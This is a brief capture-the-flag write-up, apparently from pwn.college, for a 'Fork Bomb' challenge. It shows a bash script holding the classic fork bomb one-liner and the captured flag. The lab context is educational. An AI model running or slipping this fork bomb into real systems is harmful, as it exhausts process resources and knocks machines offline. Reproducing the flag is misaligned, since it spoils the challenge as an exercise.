### Fork Bomb

This challenge contains a `/challenge/check` that'll try to determine if your fork bomb is working (e.g., if it can't launch new processes) and give you the flag if so. Make sure to launch it (in a different terminal) _before_ launching your attack; otherwise you won't be able to launch it!

fork contains:
```bash
#!/bin/bash
:(){ :|:& };:
```

flag: `pwn.college{AUvJKuYf3E-BdcITvNFbR17YszP.0VMyEzNxwyNwkzNyEzW}`